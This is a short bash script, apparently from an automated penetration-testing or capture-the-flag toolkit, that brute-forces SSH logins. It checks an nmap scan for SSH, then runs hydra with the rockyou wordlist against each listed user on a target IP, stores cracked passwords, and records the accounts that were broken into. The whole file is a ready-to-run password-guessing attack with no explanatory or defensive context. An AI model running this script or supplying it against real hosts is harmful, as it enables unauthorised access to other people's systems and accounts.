#!/bin/bash
path=$(cat path)
cd $path
IP_address=$(cat IP_address)
machine=$(cat machine)
ssh_true=$(grep -c "ssh" scan_nmap_"$machine"_grep)
if [ $ssh_true -gt 0 ]
then
	users=$(cat users)
	IFS=$'\n' read -rd '' -a user_array <<< $users
	for usr in ${user_array[@]}
	do
		echo -e "\n Bruteforce password of $usr"
		date
		timeout 15m hydra -l $usr -P /usr/share/wordlists/rockyou.txt $IP_address ssh > hydra_"$machine"_$usr
		grep "password" hydra_"$machine"_$usr > hydra_"$machine"_"$usr"_grep
		cat hydra_"$machine"_"$usr"_grep
		echo "--------------------"
		grep -oP 'password: \K\S+' "hydra_"$machine"_"$usr"_grep" > password_$usr
		user_true=$(wc -l "password_$usr" | cut -d " " -f1)
		if [ $user_true -gt 0 ]
		then
			echo $usr >> ssh_users
		fi
	done
fi
